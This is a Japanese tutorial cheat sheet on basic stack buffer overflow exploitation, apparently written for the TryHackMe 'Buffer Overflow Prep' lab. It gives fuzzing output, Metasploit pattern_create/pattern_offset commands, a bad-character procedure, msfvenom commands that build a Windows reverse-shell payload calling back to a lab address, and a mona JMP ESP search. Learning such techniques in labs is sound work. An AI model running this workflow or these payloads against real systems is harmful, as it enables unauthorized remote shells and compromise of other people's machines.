# バッファオーバーフローの基礎

## 要約
- プログラムをデバッカーで実行
- Fuzzing
- EIPの掌握
- シェルコードの作成（BadCharの特定）
- シェルコードの実行

## プログラムをデバッカーで実行

Immunity debuggerを管理者権限で開いて、攻撃対象のプログラムを実行する。

## Fuzzing
[fuzzer.py](https://github.com/firefire2/BufferOverflow-Cheatsheets/blob/main/fuzzer.py)を実行して文字列の文字数を徐々に増やし、バッファがあふれてプログラムがクラッシュする大まかなバイト数を特定する。

引数
```
$ python fuzzer.py
[-] python fuzzer.py [ip] [port] [number]
```

実行
```
$ python fuzzer.py 10.10.180.185 1337 9
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Fuzzing with 800 bytes
Fuzzing with 900 bytes
Fuzzing with 1000 bytes
Fuzzing with 1100 bytes
Fuzzing with 1200 bytes
Fuzzing with 1300 bytes
Fuzzing with 1400 bytes
Fuzzing with 1500 bytes
Fuzzing with 1600 bytes
Could not connect to 10.10.180.185:1337
```

## EIPの掌握
大まかなバイト数を特定したら、具体的なバイト数(=offset)を特定していく。

metasploit-frameworkのpattern_create.rbによるパターン作成<br>
作成するパターンは、上で特定した大まかなバイト数にプラス400バイトほどにした文字列にする。
```
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co
```

作成したパターンを、exploitコード[exploit-template.py](https://github.com/firefire2/BufferOverflow-Cheatsheets/blob/main/exploit-template.py)のoverflowの値とし、プログラムに送り込む。

プログラムがクラッシュするので、クラッシュ時のEIPの値をメモする。

metasploit-frameworkのpattern_offset.rbで、メモしたEIPの値がパターンの何バイト目かを特定する。<br>
```
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 79423379
[*] Exact match at offset 1510
```

特定したオフセットを、exploitコードのoffsetとして追記し、プログラムに送り込む。

デバッカーのEIPが、42424242(=BBBB)に、なっていればEIPの掌握が成功している。

## シェルコードの作成（BadCharの特定）
つぎにシェルコードを作成していく。まず、null(=\x00)のようにシェルコード中の文字列として使用できない文字（+BadChar）が存在するので、それらの文字を特定していく。

[byte_array.txt](https://github.com/firefire2/BufferOverflow-Cheatsheets/blob/main/byte_array.txt)の、badcharsの値をexploitコードのpayloadとして追記し、プログラムに送り込む。

デバッカーのESPを右クリック、さらに「Follow in Dump」をクリックすることで、ESPのアドレスが示すスタックを見に行く。

payloadとして追記したbyte_array.txtのbadcharsの値が、01, 02, 03,...と順番に格納されているのが確認できる。

これらを順番に確認して、飛んでいる数字がBadcharである。

ただし、1つとは限らないため、1つ特定する度にexploitのpayloadから該当するBadcharを削除して、再度プログラムに送り込んで確認する。

これを、\xffまで飛ぶ数字がなくなるまで、繰り返す。

Badcharをすべて特定したら、それらの文字が入らないようにシェルコードをmsfvenomで作成する。

エンコードあり
```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.4.18.118 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x04\x3e\x3f\xe1"
```

エンコードなし
```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.4.18.118 LPORT=443 EXITFUNC=thread -f c -b "\x00\x04\x3e\x3f\xe1"
```

基本的にエンコードありで作成するが、おそらく除外する文字列のせいで作成できない場合があるので、そういうときだけエンコードなしにする。<br>
エンコードありにする場合、paddingとしてNOP命令(=\x90)をpayloadの前に入れないとうまく実行されない場合があるので、exploitコードのpaddingのコメントアウトを入れ替える。

Badchar特定のために使ったpayloadを消して、作成したシェルコードをpayloadに追記する。

## シェルコードの実行
シェルコードの先頭から命令を実行させるには、スタックポインタが示すアドレスにプログラムの実行を飛ばすコードがあるアドレス(=JMP ESPのアドレス)をEIPに設定すればよい。

Badcharを含まないアドレスにある、JMP ESPのアドレスをデバッカー上のmonaで検索
```
!mona jmp -r esp -cpb "\x00\x04\x3e\x3f\xe1"
```

EIPはすでに掌握できているので、exploitコードの、retnの値を検索して特定したJMP ESPのアドレスに置き換える。

これで、exploitコードは完成。プログラムに送り込むことでリバースシェルが獲れる。

### Reference
- https://tryhackme.com/room/bufferoverflowprep
- https://qiita.com/v_avenger/items/0af8602e4572889f9184
